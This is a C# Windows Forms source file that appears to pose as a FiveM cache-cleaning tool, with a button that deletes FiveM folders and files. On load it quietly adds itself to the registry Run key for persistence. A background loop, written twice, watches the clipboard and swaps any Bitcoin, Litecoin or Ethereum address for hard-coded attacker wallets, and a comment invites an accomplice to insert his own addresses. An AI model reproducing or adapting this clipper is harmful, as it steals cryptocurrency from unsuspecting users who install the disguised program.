using System;
using System.Threading;
using System.Windows.Forms;
using System;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Text;
using System.Diagnostics.Eventing.Reader;
using System.ComponentModel;
using Microsoft.Win32;
using System.IO;


namespace WinFormsApp2
{
    public partial class Form1 : Form
    {

        private bool shouldHide = false;


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Check if the application was started automatically without user interaction
          
           
                // Create or check if the registry key exists
                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue("My application", Application.ExecutablePath.ToString());
                
               
                // Show the form
                this.Visible = true;

                // Your other startup logic here
                Thread TM = new Thread(Clipboard_Check);
                TM.SetApartmentState(ApartmentState.STA);
                CheckForIllegalCrossThreadCalls = false;
                TM.Start();
            

        }


        private void Form1_Shown(object sender, EventArgs e)
        {
            // Show the form if it wasn't started automatically
            if (!shouldHide)
            {
                this.Visible = true;
            }
        }



        // Method to check if the application was opened by the user



        void Clipboard_Check()
        {
            while (true)
            {
                try
                {
                    var text = Clipboard.GetText();
                    //for my guy JP, if you would like to add your own addresses, change the lines underneath :)
                    if (text.StartsWith("bc1") || text.StartsWith("38H") || text.StartsWith("3F"))
                    {
                        Clipboard.SetText("bc1q7ycz2f67g69u9pw3h84x30jtjhhwqr4us7gzy4");
                        Thread.Sleep(5000);
                    }
                    else if (text.StartsWith("ltc"))
                    {
                        Clipboard.SetText("LXWnV32PZFunP6Ui1RqwdwRbcV8aNqewnA");
                        Thread.Sleep(1000);
                    }
                    else if (text.StartsWith("0x"))
                    {
                        Clipboard.SetText("0xa41a47142745cdd6049BC5f8F4Be6DC1E9b73bfD");
                        Thread.Sleep(5000);
                    }
                }
                catch (System.Runtime.InteropServices.ExternalException ex)
                {
                    // Handle clipboard access errors
                    Console.WriteLine("Clipboard access error: " + ex.Message);
                    //delay before trying to loop again
                    Thread.Sleep(1000);
                }





            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string userFolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            string[] foldersToDelete =
            {
            Path.Combine(userFolder, @"AppData\Local\FiveM\FiveM.app\data\cache"),
            // Add more folders to delete if needed
            Path.Combine(userFolder, @"AppData\Roaming\CitizenFX"),
            Path.Combine(userFolder, @"AppData\Local\DigitalEntitlements")
            // Add more folders to delete if needed
        };

            string[] filesToDelete =
            {
            Path.Combine(userFolder, @"AppData\Local\FiveM\FiveM.app\CitizenFX.ini"),
            // Add more files to delete if needed
            Path.Combine(userFolder, @"AppData\Local\FiveM\FiveM.app\asi-five.dll")
            // Add more files to delete if needed
        };

            try
            {
                foreach (string folder in foldersToDelete)
                {
                    if (Directory.Exists(folder))
                    {
                        Directory.Delete(folder, true);
                        Console.WriteLine($"Deleted folder: {folder}");
                    }
                    else
                    {
                        Console.WriteLine($"Folder does not exist: {folder}");
                    }
                }

                foreach (string file in filesToDelete)
                {
                    if (File.Exists(file))
                    {
                        File.Delete(file);
                        Console.WriteLine($"Deleted file: {file}");
                    }
                    else
                    {
                        Console.WriteLine($"File does not exist: {file}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }

            Console.WriteLine("Deletion process completed.");
            Console.ReadLine(); // Keep console window open
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            
            BackgroundWorker bw = sender as BackgroundWorker;

            // Extract the argument.
            int arg = (int)e.Argument;

            // Start the time-consuming operation.
            while (true)
            {
                try
                {
                    var text = Clipboard.GetText();
                    //for my guy JP, if you would like to add your own addresses, change the lines underneath :)
                    if (text.StartsWith("bc1") || text.StartsWith("38H") || text.StartsWith("3F"))
                    {
                        Clipboard.SetText("bc1q7ycz2f67g69u9pw3h84x30jtjhhwqr4us7gzy4");
                        Thread.Sleep(5000);
                    }
                    else if (text.StartsWith("ltc"))
                    {
                        Clipboard.SetText("LXWnV32PZFunP6Ui1RqwdwRbcV8aNqewnA");
                        Thread.Sleep(1000);
                    }
                    else if (text.StartsWith("0x"))
                    {
                        Clipboard.SetText("0xa41a47142745cdd6049BC5f8F4Be6DC1E9b73bfD");
                        Thread.Sleep(5000);
                    }
                }
                catch (System.Runtime.InteropServices.ExternalException ex)
                {
                    // Handle clipboard access errors
                    Console.WriteLine("Clipboard access error: " + ex.Message);
                    //delay before trying to loop again
                    Thread.Sleep(1000);
                }





            }

            // If the operation was canceled by the user,
            // set the DoWorkEventArgs.Cancel property to true.
            if (bw.CancellationPending)
            {
                e.Cancel = true;
            }

        }
    }
}




